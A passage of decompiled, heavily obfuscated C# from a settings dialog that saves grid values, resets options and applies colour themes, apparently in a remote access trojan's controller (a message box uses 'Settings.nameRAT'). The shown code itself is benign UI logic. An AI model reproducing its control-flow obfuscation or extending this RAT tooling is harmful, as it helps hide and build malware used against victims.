            switch ((num23 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num22 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 1:
                (enumerator3 as IDisposable).Dispose();
                num21 = (int) num23 * -1544396467 ^ 373460314;
                continue;
              case 2:
                goto label_62;
              default:
                goto label_65;
            }
          }
        }
label_65:;
      }
label_66:
      int num24 = 0;
      IEnumerator enumerator4;
      try
      {
        enumerator4 = ((IEnumerable) this.DGV3.Rows).GetEnumerator();
label_68:
        int num25 = -1529683066;
        while (true)
        {
          int num26 = num25;
          uint num27;
          object objectValue;
          switch ((num27 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num26 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 7U)
          {
            case 0:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator4.Current);
              int num28;
              num25 = num28 = num24 != 0 ? 98789051 : (num28 = -690611868);
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().Style_Maps = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num25 = (int) num27 * -1127897845 ^ 1441170687;
              continue;
            case 2:
              int num29;
              num25 = num29 = enumerator4.MoveNext() ? -87821219 : (num29 = -1291422622);
              continue;
            case 3:
              num25 = (int) num27 * -1845892608 ^ 1492806313;
              continue;
            case 4:
              checked { ++num24; }
              num25 = 1223362217;
              continue;
            case 5:
              goto label_68;
            default:
              goto label_80;
          }
        }
      }
      finally
      {
        if (enumerator4 is IDisposable)
        {
label_76:
          int num30 = 944771101;
          while (true)
          {
            int num31 = num30;
            uint num32;
            switch ((num32 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num31 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 1:
                (enumerator4 as IDisposable).Dispose();
                num30 = (int) num32 * -1216324255 ^ -1742434387;
                continue;
              case 2:
                goto label_76;
              default:
                goto label_79;
            }
          }
        }
label_79:;
      }
label_80:
      int num33 = 0;
      IEnumerator enumerator5;
      try
      {
        enumerator5 = ((IEnumerable) this.DGV4.Rows).GetEnumerator();
label_88:
        int num34 = enumerator5.MoveNext() ? 1929805217 : (num34 = 1082110539);
        while (true)
        {
          int num35 = num34;
          uint num36;
          object objectValue;
          switch ((num36 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num35 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 7U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().Saving_data = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num34 = (int) num36 * -885852414 ^ -476372303;
              continue;
            case 1:
              int num37 = num33 != 0 ? -978626000 : (num37 = 1187163966);
              num34 = num37 ^ (int) num36 * -1104899205;
              continue;
            case 2:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator5.Current);
              num34 = 572251679;
              continue;
            case 3:
              goto label_88;
            case 5:
              num34 = 1929805217;
              continue;
            case 6:
              checked { ++num33; }
              num34 = 1433539556;
              continue;
            default:
              goto label_94;
          }
        }
      }
      finally
      {
        if (enumerator5 is IDisposable)
        {
label_90:
          int num38 = 1500742616;
          while (true)
          {
            int num39 = num38;
            uint num40;
            switch ((num40 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num39 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 0:
                goto label_90;
              case 2:
                (enumerator5 as IDisposable).Dispose();
                num38 = (int) num40 * -1142180657 ^ -1165776307;
                continue;
              default:
                goto label_93;
            }
          }
        }
label_93:;
      }
label_94:
      int num41 = 0;
      IEnumerator enumerator6;
      try
      {
        enumerator6 = ((IEnumerable) this.DGV5.Rows).GetEnumerator();
label_101:
        int num42 = enumerator6.MoveNext() ? 1509088035 : (num42 = -2113000742);
        while (true)
        {
          int num43 = num42;
          uint num44;
          object objectValue;
          switch ((num44 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num43 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 13U)
          {
            case 1:
              num42 = (int) num44 * 1733068312 ^ 1106806869;
              continue;
            case 2:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator6.Current);
              num42 = 421193287;
              continue;
            case 3:
              num42 = 1509088035;
              continue;
            case 4:
              switch (num41)
              {
                case 0:
                  goto label_108;
                case 1:
                  goto label_105;
                case 2:
                  goto label_98;
                case 3:
                  goto label_103;
                default:
                  num42 = (int) num44 * 50165468 ^ -1908671343;
                  continue;
              }
            case 5:
              num42 = (int) num44 * 772678858 ^ -340131085;
              continue;
            case 6:
label_103:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().DefaultColor_NewColorFiles = (Color) NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u00375251841, new object[0], (string[]) null, (Type[]) null, (bool[]) null);
              num42 = 30242445;
              continue;
            case 7:
label_108:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().DefaultColorForeground = (Color) NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u00375251841, new object[0], (string[]) null, (Type[]) null, (bool[]) null);
              num42 = 30242445;
              continue;
            case 8:
label_98:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().DefaultColor_ColorTitles = (Color) NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u00375251841, new object[0], (string[]) null, (Type[]) null, (bool[]) null);
              num42 = 661742955;
              continue;
            case 9:
label_105:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().DefaultColorBackground = (Color) NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u00375251841, new object[0], (string[]) null, (Type[]) null, (bool[]) null);
              num42 = -715911219;
              continue;
            case 10:
              num42 = (int) num44 * -1782828855 ^ -1339282954;
              continue;
            case 11:
              checked { ++num41; }
              num42 = -364838417;
              continue;
            case 12:
              goto label_101;
            default:
              goto label_115;
          }
        }
      }
      finally
      {
        if (enumerator6 is IDisposable)
        {
label_111:
          int num45 = -155664406;
          while (true)
          {
            int num46 = num45;
            uint num47;
            switch ((num47 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num46 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 0:
                goto label_111;
              case 2:
                (enumerator6 as IDisposable).Dispose();
                num45 = (int) num47 * -1330634158 ^ -1032493329;
                continue;
              default:
                goto label_114;
            }
          }
        }
label_114:;
      }
label_115:
      int num48 = 0;
      IEnumerator enumerator7;
      try
      {
        enumerator7 = ((IEnumerable) this.DGV6.Rows).GetEnumerator();
label_123:
        int num49 = enumerator7.MoveNext() ? -1336285749 : (num49 = 379083594);
        while (true)
        {
          int num50 = num49;
          uint num51;
          object objectValue;
          switch ((num51 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num50 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 10U)
          {
            case 0:
              int num52 = num48 == 1 ? 249974337 : (num52 = 1249724481);
              num49 = num52 ^ (int) num51 * 2075411780;
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().FontStyle = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num49 = 630831470;
              continue;
            case 2:
              goto label_123;
            case 3:
              num49 = -1336285749;
              continue;
            case 4:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().FontSize = Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num49 = 630831470;
              continue;
            case 5:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator7.Current);
              num49 = -56331185;
              continue;
            case 6:
              checked { ++num48; }
              num49 = 192819800;
              continue;
            case 7:
              int num53 = num48 == 0 ? 1183369610 : (num53 = 1886433582);
              num49 = num53 ^ (int) num51 * 2071051154;
              continue;
            case 9:
              num49 = (int) num51 * 205940577 ^ -837349559;
              continue;
            default:
              goto label_132;
          }
        }
      }
      finally
      {
        if (enumerator7 is IDisposable)
        {
label_128:
          int num54 = -1816580210;
          while (true)
          {
            int num55 = num54;
            uint num56;
            switch ((num56 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num55 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 0:
                goto label_128;
              case 1:
                (enumerator7 as IDisposable).Dispose();
                num54 = (int) num56 * -24947771 ^ 1414413168;
                continue;
              default:
                goto label_131;
            }
          }
        }
label_131:;
      }
label_132:
      int num57 = 0;
      IEnumerator enumerator8;
      try
      {
        enumerator8 = ((IEnumerable) this.DGV7.Rows).GetEnumerator();
label_134:
        int num58 = 299715845;
        while (true)
        {
          int num59 = num58;
          uint num60;
          object objectValue;
          switch ((num60 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num59 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 11U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().Flags_Visible = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num58 = -615904736;
              continue;
            case 1:
              num58 = (int) num60 * -282978044 ^ 355711376;
              continue;
            case 2:
              goto label_134;
            case 3:
              num58 = (int) num60 * -1757875140 ^ 1314953560;
              continue;
            case 4:
              int num61;
              num58 = num61 = enumerator8.MoveNext() ? 1956050905 : (num61 = 1458071261);
              continue;
            case 5:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator8.Current);
              int num62;
              num58 = num62 = num57 == 0 ? 1014672780 : (num62 = 1186959201);
              continue;
            case 6:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().Flags_Size = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num58 = -825388406;
              continue;
            case 7:
              int num63 = num57 == 1 ? 901679588 : (num63 = -1700201007);
              num58 = num63 ^ (int) num60 * -345110477;
              continue;
            case 9:
              checked { ++num57; }
              num58 = -660133442;
              continue;
            case 10:
              num58 = (int) num60 * -910660408 ^ -48842074;
              continue;
            default:
              goto label_150;
          }
        }
      }
      finally
      {
        if (enumerator8 is IDisposable)
        {
label_146:
          int num64 = 1148698191;
          while (true)
          {
            int num65 = num64;
            uint num66;
            switch ((num66 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num65 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 0:
                goto label_146;
              case 1:
                (enumerator8 as IDisposable).Dispose();
                num64 = (int) num66 * 557308253 ^ 924339100;
                continue;
              default:
                goto label_149;
            }
          }
        }
label_149:;
      }
label_150:
      int num67 = 0;
      IEnumerator enumerator9;
      try
      {
        enumerator9 = ((IEnumerable) this.DGV8.Rows).GetEnumerator();
label_152:
        int num68 = 1055231527;
        while (true)
        {
          int num69 = num68;
          uint num70;
          object objectValue;
          switch ((num70 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num69 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 7U)
          {
            case 0:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().SStatus_Visible = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num68 = (int) num70 * 1213465993 ^ 346156422;
              continue;
            case 1:
              int num71;
              num68 = num71 = enumerator9.MoveNext() ? -533119545 : (num71 = -1046851050);
              continue;
            case 2:
              num68 = (int) num70 * -585869886 ^ 797962245;
              continue;
            case 4:
              goto label_152;
            case 5:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator9.Current);
              int num72;
              num68 = num72 = num67 != 0 ? -936129862 : (num72 = 1721393172);
              continue;
            case 6:
              checked { ++num67; }
              num68 = 87217807;
              continue;
            default:
              goto label_164;
          }
        }
      }
      finally
      {
        if (enumerator9 is IDisposable)
        {
label_160:
          int num73 = -1845161978;
          while (true)
          {
            int num74 = num73;
            uint num75;
            switch ((num75 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num74 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 1:
                (enumerator9 as IDisposable).Dispose();
                num73 = (int) num75 * 723123989 ^ 940403829;
                continue;
              case 2:
                goto label_160;
              default:
                goto label_163;
            }
          }
        }
label_163:;
      }
label_164:
      int num76 = 0;
      IEnumerator enumerator10;
      try
      {
        enumerator10 = ((IEnumerable) this.DGV9.Rows).GetEnumerator();
label_166:
        int num77 = 2027666358;
        while (true)
        {
          int num78 = num77;
          uint num79;
          object objectValue;
          switch ((num79 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num78 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 7U)
          {
            case 0:
              goto label_166;
            case 2:
              int num80;
              num77 = num80 = enumerator10.MoveNext() ? -1723844640 : (num80 = 694888870);
              continue;
            case 3:
              // ISSUE: reference to a compiler-generated method
              MySettings.get_Settings().FM_IC_Size = Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type) null, EXGuarder.\u003035A1A00, new object[1]
              {
                (object) 1
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u0032C44744D, new object[0], (string[]) null, (Type[]) null, (bool[]) null));
              num77 = (int) num79 * -1810471081 ^ -765863946;
              continue;
            case 4:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator10.Current);
              int num81;
              num77 = num81 = num76 != 0 ? -839002304 : (num81 = -1698956030);
              continue;
            case 5:
              num77 = (int) num79 * -190160807 ^ -1795481452;
              continue;
            case 6:
              checked { ++num76; }
              num77 = 559702442;
              continue;
            default:
              goto label_178;
          }
        }
      }
      finally
      {
        if (enumerator10 is IDisposable)
        {
label_174:
          int num82 = -305589933;
          while (true)
          {
            int num83 = num82;
            uint num84;
            switch ((num84 = (uint) ((-613620491 - 292128167 ^ -155831127) - ((num83 ^ (1165616482 ^ -712404709 - -715438316) + -~1571289000 - (-1905690604 * 216540837 + ((1031496503 ^ 922650756) - (881103964 - -526950023))) - (-266537925 ^ -(~52595459 - ~2005237549))) * 13231977 - -130206915 * (~-884024870 ^ -86023912 ^ -1311372208)) ^ ~673204124)) % 3U)
            {
              case 0:
                goto label_174;
              case 1:
                (enumerator10 as IDisposable).Dispose();
                num82 = (int) num84 * -396881342 ^ -576393164;
                continue;
              default:
                goto label_177;
            }
          }
        }
label_177:;
      }
label_178:
      // ISSUE: reference to a compiler-generated method
      MySettings.get_Settings().Save();
      int num85 = (int) Interaction.MsgBox((object) EXGuarder.\u003700B612D, MsgBoxStyle.Information, (object) Settings.nameRAT);
      this.Close();
    }

    private void DL_Click(object sender, EventArgs e)
    {
      // ISSUE: reference to a compiler-generated method
      MySettings.get_Settings().Reset();
      this.DGV0.Rows.Clear();
label_1:
      int num1 = 1988293614;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(-(num1 ^ --(-1883817202 - -474855717) - -~-1129973193) - (540553571 * ~-1850840978 - (110216438 * 1299186427 - (-656372791 - -1938326812))) + 333008977 * (2059650802 - -426584275)) ^ -1480014227)) % 7U)
        {
          case 0:
            this.DGV5.Rows.Clear();
            this.DGV6.Rows.Clear();
            num1 = (int) num2 * 852011135 ^ -1345071517;
            continue;
          case 1:
            this.DGV1.Rows.Clear();
            this.DGV2.Rows.Clear();
            num1 = (int) num2 * 809007304 ^ 134581063;
            continue;
          case 3:
            this.DGV9.Rows.Clear();
            num1 = (int) num2 * 482554715 ^ -1379529952;
            continue;
          case 4:
            this.DGV3.Rows.Clear();
            this.DGV4.Rows.Clear();
            num1 = (int) num2 * 2099901967 ^ 470734532;
            continue;
          case 5:
            goto label_1;
          case 6:
            this.DGV7.Rows.Clear();
            this.DGV8.Rows.Clear();
            num1 = (int) num2 * 1415175716 ^ 682462274;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      this.R();
    }

    private void ClearSEL(DataGridView DG0)
    {
      IEnumerator<DataGridView> enumerator;
      try
      {
        enumerator = this.Panel1.Controls.OfType<DataGridView>().GetEnumerator();
label_7:
        int num1 = enumerator.MoveNext() ? -422714752 : (num1 = -1681078403);
        DataGridView current;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~~((num1 + (-~(1016344545 - 806086819 + (-116956269 - -57151189)) - --(-918480542 - -1004250639 - 748707321 * -855903477)) + (-(473996227 * -1527654321) - ((1042793914 ^ 1066572043) - -1782581113)) * 1950994413) * 1796666321)) % 7U)
          {
            case 0:
              int num3 = current.Rows.Count <= 0 ? 1830080916 : (num3 = 2087219881);
              num1 = num3 ^ (int) num2 * 1492126668;
              continue;
            case 1:
              current.CurrentCell = current.Rows[0].Cells[0];
              num1 = (int) num2 * 441873012 ^ 715788769;
              continue;
            case 2:
              goto label_7;
            case 3:
              current.ClearSelection();
              num1 = (int) num2 * 1271222291 ^ -1354701311;
              continue;
            case 4:
              current = enumerator.Current;
              int num4;
              num1 = num4 = Operators.CompareString(current.Name, DG0.Name, false) == 0 ? -1971082960 : (num4 = -1669508699);
              continue;
            case 5:
              goto label_12;
            case 6:
              num1 = -422714752;
              continue;
            default:
              goto label_8;
          }
        }
label_12:
        return;
label_8:;
      }
      finally
      {
        if (enumerator != null)
        {
label_10:
          int num5 = 564180256;
          while (true)
          {
            uint num6;
            switch ((num6 = (uint) ~~((num5 + (-~(1016344545 - 806086819 + (-116956269 - -57151189)) - --(-918480542 - -1004250639 - 748707321 * -855903477)) + (-(473996227 * -1527654321) - ((1042793914 ^ 1066572043) - -1782581113)) * 1950994413) * 1796666321)) % 3U)
            {
              case 0:
                goto label_10;
              case 1:
                enumerator.Dispose();
                num5 = (int) num6 * 786743184 ^ 111792786;
                continue;
              default:
                goto label_14;
            }
          }
        }
label_14:;
      }
    }

    private void DGV0_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV0);
    }

    private void DGV1_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV1);
    }

    private void DGV2_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV2);
    }

    private void DGV3_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV3);
    }

    private void DGV4_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV4);
    }

    private void DGV5_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV5);
    }

    private void DGV6_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV6);
    }

    private void DGV7_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV7);
    }

    private void DGV8_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV8);
    }

    private void DGV9_CellEnter(object sender, DataGridViewCellEventArgs e)
    {
      this.ClearSEL(this.DGV9);
    }

    private void DGV5_CellContentClick(object sender, DataGridViewCellEventArgs e)
    {
      if (!(e.RowIndex == 0 | e.RowIndex == 1 | e.RowIndex == 2 | e.RowIndex == 3))
        return;
label_1:
      int num1 = 709269381;
      Graphics graphics;
      Color backColor;
      Pen pen;
      Bitmap bitmap;
      Color_Box0 colorBox0;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(-~(num1 - (~(-297875136 * 1506065595 - (-1216687586 - -1179543801)) ^ ~(462438313 - 642711496) ^ ~(-1704886738 ^ 1225164424 * -277467475 ^ 1361091034))) * -2027752137) - 1192197216)) % 12U)
        {
          case 0:
            colorBox0 = new Color_Box0();
            num1 = (int) num2 * 1076502043 ^ -2019709994;
            continue;
          case 1:
            graphics = Graphics.FromImage((Image) bitmap);
            num1 = (int) num2 * -1462751239 ^ 1857656432;
            continue;
          case 2:
            bitmap = new Bitmap(21, 17);
            num1 = (int) num2 * -2062261807 ^ 2022407726;
            continue;
          case 3:
            pen = new Pen(ControlPaint.Light(backColor), 1f);
            num1 = (int) num2 * -1769010636 ^ 1502765892;
            continue;
          case 4:
            goto label_14;
          case 5:
            graphics.DrawRectangle(pen, 0, 0, checked (bitmap.Width - 1), checked (bitmap.Height - 1));
            this.DGV5.Rows[e.RowIndex].Tag = (object) backColor;
            this.DGV5.Rows[e.RowIndex].Cells[1].Value = (object) bitmap;
            graphics.Dispose();
            num1 = (int) num2 * 383269480 ^ -36900588;
            continue;
          case 6:
            int num3 = e.ColumnIndex != 1 ? -178729505 : (num3 = 1044895047);
            num1 = num3 ^ (int) num2 * -2130326338;
            continue;
          case 7:
            int num4 = colorBox0.ShowDialog() != DialogResult.OK ? 255222667 : (num4 = -1148686486);
            num1 = num4 ^ (int) num2 * 1283386189;
            continue;
          case 8:
            graphics.Clear(backColor);
            num1 = (int) num2 * -672334455 ^ 1784396794;
            continue;
          case 9:
            colorBox0.Close();
            num1 = 1465525123;
            continue;
          case 10:
            backColor = colorBox0.C_Box3.BackColor;
            num1 = (int) num2 * 1573026804 ^ 1140193551;
            continue;
          case 11:
            goto label_1;
          default:
            goto label_15;
        }
      }
label_14:
      return;
label_15:;
    }

    private void CrateColor(Color[] packet)
    {
      int index = 0;
      IEnumerator enumerator;
      try
      {
        enumerator = ((IEnumerable) this.DGV5.Rows).GetEnumerator();
label_2:
        int num1 = -1949634276;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Graphics graphics;
          Color color;
          Bitmap bitmap;
          DataGridViewRow dataGridViewRow;
          object objectValue;
          switch ((num3 = (uint) --(-(-426873104 - (-1612881489 - -485641438)) - -(num2 * 1194149617))) % 12U)
          {
            case 0:
              dataGridViewRow.Cells[1].Value = (object) bitmap;
              graphics.Dispose();
              num1 = (int) num3 * 1257431130 ^ 1320836352;
              continue;
            case 1:
              checked { ++index; }
              num1 = (int) num3 * -1006353711 ^ -519236466;
              continue;
            case 2:
              goto label_18;
            case 3:
              graphics = Graphics.FromImage((Image) bitmap);
              num1 = (int) num3 * 510014283 ^ -1076581688;
              continue;
            case 4:
              int num4;
              num1 = num4 = enumerator.MoveNext() ? -1581099010 : (num4 = -1651321591);
              continue;
            case 5:
              goto label_2;
            case 6:
              graphics.Clear(color);
              Pen pen = new Pen(ControlPaint.Light(color), 1f);
              graphics.DrawRectangle(pen, 0, 0, checked (bitmap.Width - 1), checked (bitmap.Height - 1));
              dataGridViewRow.Tag = (object) color;
              num1 = (int) num3 * 864202008 ^ 58624623;
              continue;
            case 7:
              dataGridViewRow = (DataGridViewRow) objectValue;
              num1 = (int) num3 * -664639464 ^ 429528467;
              continue;
            case 8:
              bitmap = new Bitmap(21, 17);
              num1 = (int) num3 * -1899124212 ^ -1311702738;
              continue;
            case 9:
              num1 = (int) num3 * 1920367693 ^ 1966031950;
              continue;
            case 10:
              color = packet[index];
              num1 = (int) num3 * -2085447240 ^ -548721631;
              continue;
            case 11:
              objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
              num1 = 1877051538;
              continue;
            default:
              goto label_14;
          }
        }
label_18:
        return;
label_14:;
      }
      finally
      {
        if (enumerator is IDisposable)
        {
label_16:
          int num5 = -42884754;
          while (true)
          {
            int num6 = num5;
            uint num7;
            switch ((num7 = (uint) --(-(-426873104 - (-1612881489 - -485641438)) - -(num6 * 1194149617))) % 3U)
            {
              case 1:
                (enumerator as IDisposable).Dispose();
                num5 = (int) num7 * -231783469 ^ -948142286;
                continue;
              case 2:
                goto label_16;
              default:
                goto label_20;
            }
          }
        }
label_20:;
      }
    }

    private void DGV1_CellContentClick(object sender, DataGridViewCellEventArgs e)
    {
    }

    private void DefaultToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CrateColor(new Color[4]
      {
        Color.FromArgb(106, 106, 106),
        Color.FromArgb(206, 206, 206),
        Color.FromArgb(70, 130, 180),
        Color.FromArgb(95, 158, 160)
      });
    }

    private void clr_1ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CrateColor(new Color[4]
      {
        Color.FromArgb(45, 156, 202),
        Color.FromArgb(37, 39, 77),
        Color.FromArgb(169, 171, 184),
        Color.FromArgb(159, 64, 103)
      });
    }

    private void clr_2ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CrateColor(new Color[4]
      {
        Color.FromArgb(55, 176, 169),
        Color.FromArgb(222, 242, 241),
        Color.FromArgb(43, 122, 119),
        Color.FromArgb(23, 36, 42)
      });
    }

    private void Clr3ToolStripMenuItem_Click(object sender, EventArgs e)
    {
      Color[] packet = new Color[4]
      {
        Color.FromArgb(47, 68, 85),
        Color.FromArgb(220, 220, 220),
        Color.FromArgb(84, 102, 116),
        Color.FromArgb(218, 123, 147)
      };
label_1:
      int num1 = 1970914490;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((~(num1 * -811885227) ^ -1649444014) - -1809493507) * 718061937)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            this.CrateColor(packet);
            num1 = (int) num2 * -1798339954 ^ -1122770930;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
